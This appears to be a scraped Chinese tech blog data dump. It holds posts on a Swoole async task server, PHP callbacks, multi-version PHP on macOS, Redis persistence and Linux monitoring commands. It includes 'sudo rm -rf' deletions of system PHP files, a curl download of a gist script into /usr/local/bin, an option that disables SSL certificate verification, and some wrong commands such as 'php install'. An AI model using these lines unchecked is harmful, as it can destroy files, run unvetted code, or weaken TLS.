$this-&gt;server-&gt;on(&quot;finish&quot;, [$this, &quot;onFinish&quot;]); &#x2F;&#x2F; 启用服务 $this-&gt;server-&gt;start(); &#125; &#x2F;** * 监听连接事件 * @param $server * @param $fd *&#x2F; public function onConnect($server, $fd)&#123; echo &quot;连接成功&quot;.PHP_EOL; &#125; &#x2F;** * 监听客户端发送的消息 * @param $server &quot;Server 对象&quot; * @param $fd &quot;唯一标示&quot; * @param $form_id * @param $data &quot;客户端发送的数据&quot; *&#x2F; public function onReceive($server, $fd, $form_id, $data)&#123; &#x2F;&#x2F; 投递任务 $server-&gt;task($data); $server-&gt;send($fd, &quot;这是客户端向服务端发送的信息：&#123;$data&#125;&quot;); &#125; &#x2F;** * 监听异步任务task事件 * @param $server * @param $task_id * @param $worker_id * @param $data * @return string *&#x2F; public function onTask($server, $task_id, $worker_id, $data)&#123; $data &#x3D; json_decode($data, true); echo &quot;开始执行异步任务&quot;.PHP_EOL; try &#123; &#x2F;&#x2F; 开始执行任务 $this-&gt;addLog(date(&#39;Y-m-d H:i:s&#39;).&quot;开始执行任务&quot;.PHP_EOL ); &#x2F;&#x2F; 通知worker（必须 return，否则不会调用 onFinish） return $this-&gt;curl($data[&#39;url&#39;], $data[&#39;data&#39;], $data[&#39;type&#39;]); &#125; catch (Exception $exception) &#123; &#x2F;&#x2F; 执行任务失败 $this-&gt;addLog(date(&#39;Y-m-d H:i:s&#39;).&quot;执行任务失败&quot;.PHP_EOL); &#125; &#125; &#x2F;** * 监听finish 事件 * @param $server * @param $task_id * @param $data *&#x2F; public function onFinish($server, $task_id, $data)&#123; $this-&gt;addLog(date(&quot;Y-m-d H:i:s&quot;).&quot;异步任务执行完成&quot;.PHP_EOL); print_r( &quot;来自服务端的消息：&#123;$data&#125;&quot;); &#125; &#x2F;** * 监听关闭连接事件 * @param $server * @param $fd *&#x2F; public function onClose($server, $fd)&#123; echo &quot;关闭TCP 连接&quot;.PHP_EOL; &#125; &#x2F;** * 发起Get 或 Post 请求 * @param string $url 请求地址 * @param array $request_data 请求参数 * @param string $request_type 请求类型 * @param array $headers 头信息 * @param bool $is_ssl 是否是ssl * @return bool|string *&#x2F; public function curl($url &#x3D; &#39;&#39;, $request_data &#x3D; [], $request_type &#x3D; &#39;get&#39;, $headers &#x3D; [], $is_ssl &#x3D; false) &#123; $curl &#x3D; curl_init (); &#x2F;&#x2F; 初始化 &#x2F;&#x2F; 设置 URL curl_setopt($curl, CURLOPT_URL, $url); &#x2F;&#x2F; 不返回 Response 头部信息 curl_setopt ( $curl, CURLOPT_HEADER, 0 ); &#x2F;&#x2F; 如果成功只将结果返回，不自动输出任何内容 curl_setopt ( $curl, CURLOPT_RETURNTRANSFER, 1 ); &#x2F;&#x2F; 设置请求参数 curl_setopt ( $curl, CURLOPT_POSTFIELDS, http_build_query($request_data)); &#x2F;&#x2F; TRUE 时追踪句柄的请求字符串 curl_setopt($curl, CURLINFO_HEADER_OUT, true); &#x2F;&#x2F; Post 类型增加以下处理 if( $request_type &#x3D;&#x3D; &#39;post&#39;) &#123; &#x2F;&#x2F; 设置为POST方式 curl_setopt ( $curl, CURLOPT_POST, 1 ); &#x2F;&#x2F; 设置头信息 curl_setopt($curl, CURLOPT_HTTPHEADER, array(&#39;Content-Type: application&#x2F;json&#39;, &#39;Content-Length:&#39; . strlen(json_encode($request_data)))); &#x2F;&#x2F; 设置请求参数 curl_setopt ( $curl, CURLOPT_POSTFIELDS, json_encode($request_data)); &#x2F;&#x2F; 当POST 数据大于1024 时强制执行 curl_setopt ( $curl, CURLOPT_HTTPHEADER, array(&quot;Expect:&quot;)); &#125; &#x2F;&#x2F; 判断是否绕过证书 if( $is_ssl ) &#123; &#x2F;&#x2F;绕过ssl验证 curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); &#125; if(!empty($headers)) curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); &#x2F;&#x2F; 执行 $result &#x3D; curl_exec ( $curl ); if ( $result &#x3D;&#x3D; FALSE) return false; &#x2F;&#x2F; 关闭资源 curl_close ( $curl ); return $result; &#125; &#x2F;** * 写入日志 * @param $content *&#x2F; public function addLog($content)&#123; $path &#x3D; dirname(__FILE__).&quot;&#x2F;logs&#x2F;&quot;; if (!is_dir($path)) mkdir($path,0777,true); $file_name &#x3D; $path.date(&quot;Y_m_d&quot;) . &quot;.log&quot;; if (!file_exists($file_name)) &#123; touch($file_name); chown($file_name, &quot;root&quot;); &#125; $file_log &#x3D; fopen($file_name, &quot;a&quot;); fputs($file_log, $content); fclose($file_log); &#125;&#125;$server &#x3D; new taskServer(); 客户端这里的客户端可以是 cli 脚本，也可以是对应控制器中的具体方法，只要能连接Swoole 监听的Tcp 就行。 12345678910111213141516171819202122232425&lt;?phpnamespace app\\admin\\controller;class Index extends Base&#123; public function index()&#123; $client &#x3D; new \\Swoole\\Client(SWOOLE_SOCK_TCP); if (!$client-&gt;connect(&#39;0.0.0.0&#39;, 9501)) &#123; return json(&quot;connect failed. Error: &#123;$client-&gt;errCode&#125;\\n&quot;); &#125; $data &#x3D; [ &quot;url&quot; &#x3D;&gt; &quot;https:&#x2F;&#x2F;api.paasoo.com&#x2F;json&quot;, &quot;data&quot; &#x3D;&gt; [ &quot;key&quot; &#x3D;&gt; &quot;key&quot;, &quot;secret&quot; &#x3D;&gt; &quot;secret&quot;, &quot;from&quot; &#x3D;&gt; &quot;sms&quot;, &quot;to&quot; &#x3D;&gt; &quot;mobile_phone&quot;, &quot;text&quot; &#x3D;&gt; &quot;test&quot;, ], &quot;type&quot; &#x3D;&gt; &quot;get&quot; ]; $client-&gt;send(json_encode($data)); return json($client-&gt;recv()); &#125;&#125; 参考链接 php使用Swoole来实现实时异步任务队列 基于 swoole 下 异步消息队列 API","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"PHP 的四种设置回调函数的方式","slug":"php-s-four-ways-to-set-callback-functions","date":"2020-11-25T14:18:04.000Z","updated":"2020-11-25T14:19:29.255Z","comments":true,"path":"php-s-four-ways-to-set-callback-functions/","link":"","permalink":"https://www.0x2beace.com/php-s-four-ways-to-set-callback-functions/","excerpt":"最近在学习Swoole，顺手整理一下PHP 中的四种设置回调函数的方式。","text":"最近在学习Swoole，顺手整理一下PHP 中的四种设置回调函数的方式。 匿名函数1234&lt;?php$server-&gt;on(&quot;request&quot;, function($request, $respone)&#123; echo &quot;Http Server&quot;;&#125;); 类静态函数1234567class A&#123; static function onConnect($server, $fd)&#123; echo &quot;UDP Server&quot;; &#125;&#125;$server-&gt;on(&quot;connect&quot;, &quot;A::onConnect&quot;);$server-&gt;on(&quot;conncet&quot;, [&quot;A&quot;, &quot;onConnect&quot;]); 函数12345$server-&gt;on(&quot;connect&quot;, &quot;callBack&quot;);function callBack($server, $fd)&#123; echo &quot;Tcp Server&quot;;&#125; 对象方法12345678910111213141516171819# 情景一Class A&#123; public function __construct()&#123; $this-&gt;server-&gt;on(&quot;open&quot;, [$this, &quot;onOpen&quot;]); &#125; public function onOpen($server, $request)&#123; echo &quot;WebSocket Server&quot;; &#125;&#125;# 情景二Class A&#123; function onOpen($request, $respone)&#123; echo &quot;WebSocket Server&quot;; &#125;&#125;$obj &#x3D; new A();$server-&gt;on(&quot;open&quot;, [$obj, &quot;onOpen&quot;]);","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"如何在 Mac OS 上安装多版本的 PHP","slug":"how-to-install-multiple-versions-of-php-on-mac-os","date":"2020-11-24T15:42:11.000Z","updated":"2020-11-24T15:45:22.053Z","comments":true,"path":"how-to-install-multiple-versions-of-php-on-mac-os/","link":"","permalink":"https://www.0x2beace.com/how-to-install-multiple-versions-of-php-on-mac-os/","excerpt":"很久之前在Mac 上做开发，起初搭建环境时遇到了部分问题，加上Mac 预装的那个PHP 版本，实在是不好用，php-fpm 总是启不动，最后索性决定在本地自己装个多版本，可以随时自由切换。","text":"很久之前在Mac 上做开发，起初搭建环境时遇到了部分问题，加上Mac 预装的那个PHP 版本，实在是不好用，php-fpm 总是启不动，最后索性决定在本地自己装个多版本，可以随时自由切换。 是否需要清除旧版本？ 因为需要在Mac 上安装其他版本，所以预装的那个版本的PHP 的存在就没啥意义了。考虑到本机的其他软件可能会依赖它，为了给以后省些事，最后还是决定将预装的版本给移除掉。 事实证明移除了也没关系。 移除旧版本这里说的旧版本指的是Mac 自带的PHP版本。 123456789101112# &#x2F;private&#x2F;etc&#x2F;$ sudo rm -rfi php-fpm.conf.default php-fpm.conf php.ini.default php-fpm.d&#x2F;# &#x2F;usr&#x2F;bin&#x2F;$ sudo rm -rfi php php-config phpize# &#x2F;usr&#x2F;lib&#x2F;$ sudo rm -rf php&#x2F;# &#x2F;usr&#x2F;sbin&#x2F;$ sudo rm -rf php-fpm# &#x2F;usr&#x2F;share&#x2F;$ sudo rm -rf php# &#x2F;usr&#x2F;share&#x2F;man&#x2F;man1&#x2F;$ sudo rm -rf php-config.1 php.1 phpize.1 执行完上面这些命令就能将旧版本的PHP 彻底的从你的Mac 上移除了。 安装多版本直到2018年3月底，所有PHP 相关的brew 都由 homebrew/php tab 处理，但是已经弃用了，所以现在我们使用homebrew/core包中的可用的内容。这应该是一个更好维护但是不太完整的包。 由于PHP5.6和PHP7.0在 Homebrew 上已被弃用，因为以不被支持，虽然不建议在生产环境中使用，但还是可以在开发环境中使用这些不受支持的版本，可以参考：PHP支持的版本。 请记住，Homebrew 正式支持PHP7.1 到 7.3 ，因此如果要安装 PHP5.6或PHP7.0，则需要执行如下命令： 12345$ brew tap exolnet&#x2F;homebrew-deprecatedUpdating Homebrew...&#x3D;&#x3D;&gt; Auto-updated Homebrew!Updated 1 tap (homebrew&#x2F;core).…… 接下来正式开始安装PHP 的各种版本，并使用简单的脚本来进行版本之间的切换。 12345$ php install php@5.6$ php install php@7.0$ php install php@7.1$ php install php@7.2$ php install php@7.3 第一个安装所花费的时间长一些，因为需要安装一堆brew 的依赖，随后其他版本的安装的将很快。 所安装各版本的PHP都在该目录下： 12345$ ls &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php5.6 7.0 7.1 7.2 7.3# php.ini 配置文件目录&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;x.x&#x2F;php.ini 安装完以上版本的PHP 之后，执行： 12345$ php -v PHP 7.3.5 (cli) (built: May 2 2019 12:40:36) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.3.5, Copyright (c) 1998-2018 Zend Technologies with Zend OPcache v7.3.5, Copyright (c) 1999-2018, by Zend Technologies 可以看到目前所使用的PHP 版本是7.3（最后安装完的那个），现在试图切换到第一个安装的PHP 版本： 1$ brew unlink php@7.3 &amp;&amp; brew link --force --overwrite php@5.6 unlick 安装PHP 版本之间不再需要联系，因为默认情况下他们是没有符号链接。 再次查看当前版本： 12345$ php -vPHP 5.6.40 (cli) (built: Apr 23 2019 11:14:34)Copyright (c) 1997-2016 The PHP GroupZend Engine v2.6.0, Copyright (c) 1998-2016 Zend Technologies with Zend OPcache v7.0.6-dev, Copyright (c) 1999-2016, by Zend Technologies 切换的挺顺利的，但如果每次需要切换时都需要这样输入就变得很麻烦了，幸运的是，一些勤劳的人已经为我们完成了艰苦的工作，并编写了一个非常方便的脚本——PHP切换器脚本。 将sphp脚本安装到 brew 的标准中/usr/local/bin： 12$ curl -L https:&#x2F;&#x2F;gist.githubusercontent.com&#x2F;rhukster&#x2F;f4c04f1bf59e0b74e335ee5d186a98e2&#x2F;raw &gt; &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sphp$ chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sphp 多版本切换完成这些步骤后，就能够使用脚本命令切换PHP版本： 1$ sphp 7.2 使用时会需要提供管理员密码，相比长长的命令这已经省事很多了。 好了，到这里就顺利的完成了多版本的PHP 安装以及切换。 管理 PHP 服务在不需要切换版本时，使用brew services命令可以对该版本的PHP 进行管理： 启动/停止/重启 PHP服务： 1$ brew services start&#x2F;stop&#x2F;restart php 当PHP 服务启动时，通过查看进程列表，可以发现多了几个名为php-fpm 的进程。 php-fpm的进程所在目录：/usr/local/opt/php/sbin/php-fpm 这个进程很重要，在与 Nginx 交互时，如果没有启动它，通常会收到 502 Bad Gateway 的错误。 启动 php-fpm尽管不需要刻意的去管理这个进程，但如果这个进程意外停止运行了，还是要知道该如何启动它。 前台启动12$ cd &#x2F;usr&#x2F;local&#x2F;opt&#x2F;php&#x2F;sbin&#x2F;$ .&#x2F;php-fpm 用这种方式启动，当使用⌃ C退出时，进程也会跟着退出。 后台启动12# &#x2F;usr&#x2F;local&#x2F;opt&#x2F;php&#x2F;sbin&#x2F;$ .&#x2F;php-fpm &amp; 如果用这种方式启动，就算退出了当前会话，进程会以守护进程的方式运行着。 检查PHP 版本最后再啰嗦两句，如果需要把当前5.6版本切换成7.2，那么需要分别做两件事： 123456# 第一步$ sphp 7.2# 第二步$ brew services stop php@5.6$ brew services start php@7.2 如果只做了这一步，那么你会发现 php -v的版本输出的确是 7.2，但php_info()所打印的结果却还是 5.6。 这是因为机器上安装了多个PHP 版本，当使用php -v命令时，它将显示默认PHP CLI的版本，而该版本可能不是网站所使用的版本。 所以找出用于特定网站的PHP 版本的最可靠方法是使用phpinfo()函数。 参考链接 Mac 下 Nginx、PHP、MySQL 和 PHP-fpm 的安装和配置 如何在Mac 上安装多版本的PHP 如何卸载Mac 预装的PHP 如何检查PHP 版本","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Redis 持久化快速上手","slug":"redis-persistence-quick-start","date":"2020-11-21T11:05:31.000Z","updated":"2020-11-23T12:34:07.708Z","comments":true,"path":"redis-persistence-quick-start/","link":"","permalink":"https://www.0x2beace.com/redis-persistence-quick-start/","excerpt":"什么是持久化？ Redis 所有数据都是存储在内存中的，对于数据的更新将异步的保存在磁盘中，当Redis实例重启时，即可利用之前持久化的文件实现数据恢复。","text":"什么是持久化？ Redis 所有数据都是存储在内存中的，对于数据的更新将异步的保存在磁盘中，当Redis实例重启时，即可利用之前持久化的文件实现数据恢复。 主流数据库的持久化方式： 快照 Mysql dump Redis rdb 日志 Mysql binlog Redis aof RDB什么是RDB？Redis 通过一条命令或者某种方式创建 rdb 文件，该文件是二进制格式，存储在硬盘中。 当需要对Redis 进行恢复时，就可以去加载该文件。数据恢复的程度，取决于 rdb文件（快照）产生的时刻。 三种触发机制Redis 生成 rdb 文件有三种方式，分别是： save bgsave 自动策略 savesave 命令有如下特点： 同步阻塞 文件策略：如果存在旧的rdb 文件，则会替换成新的 复杂度：O（N） bgsavebgsave 命令有如下特点： 异步非阻塞（几乎不会阻塞客户端） 文件策略和复杂度同上。 save 还是 bgsave？ 命令 save bgsave IO类型 同步 异步 是否阻塞 是 否（阻塞发生在fork() 复杂度 O(n) O(n) 优点 不会消耗额外内存 不阻塞客户端 缺点 阻塞客户端 需要fork，消耗内存 在数据量不大的情况下，其实使用save 还是bgsave 并没有什么差异。 它俩都是需要手动执行命令才会触发机制，那么有没有自动的方式呢？答案是有的。 自动策略自动生成策略是根据某个规则来决定是否生成 rdb 文件，这个过程也是一个bgsave 的过程。 默认策略：|seconds|changes||-|-||900|1||300|10||60|10000| 上述配置的意思是：如果在60s 中做了10000 次改变或者在 300s 中做了 10次 改变，或者在900s 中做了 1 次改变，则均会触发bgsave。 配置12345678#save 900 1#save 300 10 #save 60 10000dbfilename dump.rdb &#x2F;&#x2F; rdb 文件名称dir &#x2F;big_disk_path &#x2F;&#x2F; 工作目录stop-writes-on-bgsave-error yes &#x2F;&#x2F; 如果发生错误，停止写入rdbcompression yes &#x2F;&#x2F; 采用压缩格式 rdbchecksum yes &#x2F;&#x2F; 对rdb 文件进行检验 触发机制Redis 当达到以下触发机制时，也会自动创建rdb 文件。 全量复制 debug reload showdown RDB 文件恢复前面已经提到过了，持久化的目的是为了解决内存异常导致的数据丢失问题，如果真的遇到了这样的情况，RDB 文件又是如何实现数据恢复的呢？ 因为开启持久化之后，数据会存储到名为 dump.rdb 的文件中，当 Redis 服务器重启时，检测到 dump.rdb 文件后，就会自动加载进行数据恢复。 AOF在正式介绍什么是AOF 之前，我们先来了解一下RDB 方式现存的问题。 耗时、耗性能 不可控、丢失数据 什么是AOF？与RDB 不同的是，它是通过保存所执行的写命令来实现的，并且保存的数据格式是客户端发送的命令。 三种策略Redis 在执行写命令时，首先写入硬盘的缓冲区，缓冲区会根据以下三种策略去刷新到磁盘中。 always：每次写入都把缓冲区 fsync 到硬盘，性能影响最大，占用磁盘 IO 较高，数据安全性最高。 everysec：每秒把缓冲区 fsync 到硬盘，对性能影响相对较小。 no：由系统决定是否 fsync。 always 还是 everysec 还是 no？ 命令 always everysec no 优点 不丢失数据 每秒一次 fsync 不用管 缺点 IO 开销较大，一般的sata 盘只有几百 TPS 丢一秒数据 不可控 AOF 重写来看这样一种情况： 12345678910127.0.0.1:6379&gt; set name php OK127.0.0.1:6379&gt; set name cOK127.0.0.1:6379&gt; set name pythonOK127.0.0.1:6379&gt; set name jsOK127.0.0.1:6379&gt; get name &quot;js&quot; 虽然set 了很多次，但是name 的值，只受最后一次set 的影响，所以前面那么多次，其实没有必要也保存到AOF 文件中。 满足所设置的条件时，会自动触发 AOF 重写，此时 Redis 会扫描整个实例的数据，重新生成一个 AOF 文件来达到瘦身的效果。 配置12345678910&#x2F;&#x2F; AOFappendonly yes &#x2F;&#x2F; 开启AOF 策略appendfilename &quot;appendonly-$&#123;port&#125;.aof&quot; &#x2F;&#x2F; aof 文件名appendfsync everysec &#x2F;&#x2F; 刷新策略dir &#x2F;big_disk_path &#x2F;&#x2F; 工作目录no-appendfsync-on-write yes &#x2F;&#x2F; AOF 重写时，是否需要做AOF 检测操作&#x2F;&#x2F; AOF 重写auto-aof-rewrite-percentage 100 &#x2F;&#x2F; AOF 文件距离上次文件增长超过多少百分比auto-aof-rewrite-min-size 64mb &#x2F;&#x2F; AOF 文件体积最小多大以上触发 AOF 文件恢复与 RBD 文件不同，因为AOF 文件的数据格式，是由命令组成的，所以客户端直接执行每条命令就可以将数据进行恢复。 RDB 还是AOF？ RDB 和AOF 有各自的优缺点，那么到底该选择哪个呢？ 并没有绝对正确的答案。需要根据实际情况去作取舍，不过通常都是使用混合持久化的方式。 命令 RDB AOF 启动优先级 低 高 体积 小 大 恢复速度 快 慢 数据安全性 丢数据 根据策略决定 级别 重 轻 混合持久化混合持久化是通过 aof-use-rdb-preamble 参数来开启的。它的操作方式是这样的，在写入的时候先把数据以 RDB 的形式写入文件的开头，再将后续的写命令以 AOF 的格式追加到文件中。这样既能保证数据恢复时的速度，同时又能减少数据丢失的风险。 那么混合持久化中是如何来进行数据恢复的呢？在 Redis 重启时，先加载 RDB 的内容，然后再重放增量 AOF 格式命令。这样就避免了 AOF 持久化时的全量加载，从而使加载速率得到大幅提升。 总结RDB持久化 将某一时刻的数据以二进制形式写入到磁盘里，服务重启时检测到对应文件自动加载进行数据恢复。 有手动触发和自动触发两种机制。 AOF持久化 以文件追加的方式写入客户端执行的写命令。 数据恢复时，通过创建伪客户端的方式执行命令，直到恢复完成。 混合持久化 在写入的时候先把数据以 RDB 的形式写入文件的开头，再将后续的写命令以 AOF 的格式追加到文件中。 参考链接 老半天，终于把 redis 持久化搞懂了","categories":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"},{"name":"持久化","slug":"持久化","permalink":"https://www.0x2beace.com/tags/%E6%8C%81%E4%B9%85%E5%8C%96/"}]},{"title":"Linux系统监控命令整理汇总","slug":"summary-of-linux-system-monitoring-commands","date":"2020-11-17T14:55:16.000Z","updated":"2020-11-19T15:03:30.404Z","comments":true,"path":"summary-of-linux-system-monitoring-commands/","link":"","permalink":"https://www.0x2beace.com/summary-of-linux-system-monitoring-commands/","excerpt":"以下命令以Ubuntu 18.04 LTS 系统为准。","text":"以下命令以Ubuntu 18.04 LTS 系统为准。 命令 功能 实例 free 查看内存使用情况，包括物理内存和虚拟内存 free -h 或 free -m vmstat 对系统的整体情况进行统计，包括内核进程、虚拟内存、磁盘、陷阱和 CPU 活动的统计信息 vmstat 2 100 top 实时显示系统中各个进程的资源占用状况及总体状况 top mpstat 实时系统监控工具，它会报告与CPU相关的统计信息 mpstat sar 收集、报告和保存CPU、内存、输入输出端口使用情况 sar -n DEV 3 100 netstat 检验本机各端口的网络连接情况，用于显示与IP、TCP、UDP和ICMP协议相关的统计数据 netstat -a tcpdump 用于捕捉或者过滤网络上指定接口上接收或者传输的TCP/IP包 tcpdump -i eth0 -c 3 iptraf 用来生成包括TCP信息、UDP计数、ICMP和OSPF信息、以太网负载信息、节点状态信息、IP校验和错误等等统计数据 iptraf iostat 收集显示系统存储设备输入和输出状态统计 iostat -x -k 2 100 lsof 查看进程打开的文件的工具，查看监听端口 lsof -i :3000 atop 显示的是各种系统资源（CPU, memory, network, I/O, kernel）的综合，并且在高负载的情况下进行了彩色标注 atop htop 它和top命令十分相似，高级的交互式的实时linux进程监控工具 htop ps 最基本同时也是非常强大的进程查看命令 ps aux glances 监视 CPU，平均负载，内存，网络流量，磁盘 I/O，其他处理器 和 文件系统 空间的利用情况 glances dstat 全能系统信息统计工具，可用于替换vmstat、iostat、netstat、nfsstat和ifstat这些命令的工具 dstat uptime 用于查看服务器运行了多长时间以及有多少个用户登录，快速获知服务器的负荷情况 uptime dmesg 主要用来显示内核信息。使用dmesg可以有效诊断机器硬件故障或者添加硬件出现的问题 dmesg mpstat 用于报告多路CPU主机的每颗CPU活动情况，以及整个主机的CPU情况 mpstat 2 3 nmon 监控CPU、内存、I/O、文件系统及网络资源。对于内存的使用，它可以实时的显示 总/剩余内存、交换空间等信息 nmon mytop 用于监控 mysql 的线程和性能。它能让你实时查看数据库以及正在处理哪些查询 mytop iftop 用来监控网卡的实时流量（可以指定网段）、反向解析IP、显示端口信息等 iftop jnettop 以相同的方式来监测网络流量但比 iftop 更形象。它还支持自定义的文本输出，并能以友好的交互方式来深度分析日志 jnettop ngrep 网络层的 grep。它使用 pcap ，允许通过指定扩展正则表达式或十六进制表达式来匹配数据包 ngrep nmap 可以扫描你服务器开放的端口并且可以检测正在使用哪个操作系统 nmap localhost du 查看Linux系统中某目录的大小 du -sh * fdisk 查看硬盘及分区信息 fdisk -l 内存监控freefree命令可以显示当前系统未使用的和已使用的内存数目，还可以显示被内核使用的内存缓冲区。 语法 1free (选项) 常用选项：-b：以Byte为单位显示内存使用情况；-k：以KB为单位显示内存使用情况；-m：以MB为单位显示内存使用情况；-g：以GB为单位显示内存使用情况;-o：不显示缓冲区调节列；-t：显示内存总和列；-V：显示版本信息。 字段说明： total：内存总数； used：已经使用的内存数，包括 cached 和应用程序实际使用的内存； free：空闲的内存数； shared：当前已经废弃不用； buffers：缓存内存数； cached：缓存内存数。 关系：total = used + free vmstatvmstat命令 的含义为显示虚拟内存状态（“Viryual Memor Statics”），但是它可以报告关于进程、内存、I/O等系统整体运行状态。 语法 1vmstat (选项) (参数) 选项-a：显示活动内页；-f：显示启动后创建的进程总数；-m：显示slab信息；-n：头信息仅显示一次；-s：以表格方式显示事件计数器和内存状态；-d：报告磁盘状态；-p：显示指定的硬盘分区状态；-S：输出信息的单位。 参数 事件间隔：状态信息刷新的时间间隔； 次数：显示报告的次数。 字段说明：Procs（进程） r: 运行和等待CPU时间片的进程数，这个值如果长期大于系统CPU个数，就说明CPU资源不足，可以考虑增加CPU b: 等待资源的进程数，比如正在等待I/O或者内存交换等 Memory（内存） swpd: 使用虚拟内存大小，如果swpd的值不为0，但是SI，SO的值长期为0，这种情况不会影响系统性能。 free: 空闲物理内存大小（以KB为单位）。 buff: 用作缓冲的内存大小。 cache: 用作缓存的内存大小，如果cache的值大的时候，说明cache处的文件数多。如果此时IO中的bi比较小，就说明文件系统效率比较好。 Swap si: 每秒从交换区写到内存的大小，由磁盘调入内存。 so: 每秒写入交换区的内存大小，由内存调入磁盘。 注意：内存够用的时候，这2个值都是0，如果这2个值长期大于0时，系统性能会受到影响，磁盘IO和CPU资源都会被消耗。有些朋友看到空闲内存（free）很少的或接近于0时，就认为内存不够用了，不能光看这一点，还要结合si和so，如果free很少，但是si和so也很少（大多时候是0），那么不用担心，系统性能这时不会受到影响的。 IO（现在的Linux版本块的大小为1kb） bi: 每秒读取的块数 bo: 每秒写入的块数 注意：随机磁盘读写的时候，这2个值较大（如超出1024k)，而且wa值比较大，则表示系统磁盘IO性能瓶颈。 system（系统） in: 每秒中断数，包括时钟中断。 cs: 每秒上下文切换数。 注意：上面2个值越大，会看到由内核消耗的CPU时间会越大。 CPU（以百分比表示）us: 用户进程执行时间百分比(user time)us的值比较高时，说明用户进程消耗的CPU时间多，但是如果长期超50%的使用，那么我们就该考虑优化程序算法或者进行加速。 sy: 内核系统进程执行时间百分比(system time)sy的值高时，说明系统内核消耗的CPU资源多，这并不是良性表现，我们应该检查原因。 id: 空闲时间百分比 wa: IO等待时间百分比wa的值高时，说明IO等待比较严重，这可能由于磁盘大量作随机访问造成，也有可能磁盘出现瓶颈（块操作）。 st：一般不关注，虚拟机占用的时间百分比。 CPU 监控toptop命令 可以实时动态地查看系统的整体运行情况。 语法： 1top (选项) 选项：-b：以批处理模式操作；-c：显示完整的治命令；-d：屏幕刷新间隔时间；-I：忽略失效过程；-s：保密模式；-S：累积模式；-i&lt;时间&gt;：设置间隔时间；-u&lt;用户名&gt;：指定用户名；-p&lt;进程号&gt;：指定进程；-n&lt;次数&gt;：循环显示的次数。 字段说明： top：系统当前时间 up xxx days：系统运行时间 1 users：当前登录用户个数 load average：系统负载。即任务队列的平均长度。三个数值分别为最近1分钟、最近5分钟、最近15分钟的平均负载。——超过N（CPU核数）说明系统满负荷运行。 Tasks total：总进程数 running：正在运行的进程数 sleeping：睡眠的进程数 stopped：停止的进程数 zombie：冻结的进程数 %Cpu(s) us：用户进程消耗的CPU百分比 sy：内核进程消耗的CPU百分比 ni：改变过优先级的进程占用CPU的百分比 id：空闲CPU的百分比 wa：IO等待消耗的CPU百分比 Mem total：物理内存总量 free：空闲物理内存总量 used：已用物理内存总量 buff：用作内核缓存内存总量 Swap total：虚拟内存总量 free：空闲虚拟内存总量 used：已用虚拟内存总量 mpstatmpstat命令 指令主要用于多CPU环境下，它显示各个可用CPU的状态系你想。 语法： 1mpstat (选项) (参数) 选项： 1-P：指定CPU编号。 参数： 间隔时间：每次报告的间隔时间（秒）； 次数：显示报告的次数。 ALL表示显示所有CPUs，也可以指定某个CPU；2表示刷新间隔。 网络监控sarsar命令 是Linux下系统运行状态统计工具，它将指定的操作系统状态计数器显示到标准输出设备。 字段说明： IFACE：网络设备的名称 rxpck/s：每秒钟接收到的包数目 txpck/s：每秒钟发送出去的包数目 rxkB/s：每秒钟接收到的字节数 txkB/s：每秒钟发送出去的字节数 netstatnetstat命令一般用于检验本机各端口的网络连接情况，用于显示与IP、TCP、UDP和ICMP协议相关的统计数据。 常用实例： 123456789netstat -aup # 输出所有UDP连接状况netstat -atp # 输出所有TCP连接状况netstat -s # 显示各个协议的网络统计信息netstat -i # 显示网卡列表netstat -r # 显示路由表信息netstat -l # 只显示监听端口netstat -lt # 只列出所有监听 tcp 端口netstat -lu # 只列出所有监听 udp 端口netstat -lx # 只列出所有监听 UNIX 端口 磁盘监控dfdf命令 用于显示磁盘分区上的可使用的磁盘空间。如果没有文件名被指定，则显示当前所有被挂载的文件系统，默认以 KB 为单位。 语法： 1df (选项) (参数) 选项：-a 全部文件系统列表-h 以方便阅读的方式显示-i 显示inode信息-T 显示文件系统类型-l 只显示本地文件系统-k 以KB为单位-m 以MB为单位 参数： 文件：指定文件系统上的文件。 iostatiostat命令 被用于监视系统输入输出设备和CPU的使用情况。 语法： 1iostat (选项) (参数) 选项：-c：仅显示CPU使用情况；-d：仅显示设备利用率；-k：显示状态以千字节每秒为单位，而不使用块每秒；-m：显示状态以兆字节每秒为单位；-p：仅显示块设备和所有被使用的其他分区的状态；-t：显示每个报告产生时的时间；-V：显示版号并退出；-x：显示扩展状态。 参数： 间隔时间：每次报告的间隔时间（秒）； 次数：显示报告的次数。 字段说明： r/s: 每秒完成的读 I/O 设备次数。 w/s: 每秒完成的写 I/O 设备次数。 rkB/s: 每秒读K字节数.是 rsect/s 的一半,因为每扇区大小为512字节。 wkB/s: 每秒写K字节数.是 wsect/s 的一半。 avgrq-sz: 平均每次设备I/O操作的数据大小 (扇区)。 avgqu-sz: 平均I/O队列长度。 await: 平均每次设备I/O操作的等待时间 (毫秒)。 svctm: 平均每次设备I/O操作的服务时间 (毫秒)。 %util: 一秒中有百分之多少的时间用于 I/O 操作,或者说一秒中有多少时间 I/O 队列是非空的。 iotopiotop命令 是一个用来监视磁盘I/O使用状况的top类工具。 iotop具有与top相似的UI，其中包括PID、用户、I/O、进程等相关信息。Linux下的IO统计工具如iostat，nmon等大多数是只能统计到per设备的读写情况，如果你想知道每个进程是如何使用IO的就比较麻烦，使用iotop命令可以很方便的查看。 语法： 1iotop (选项) 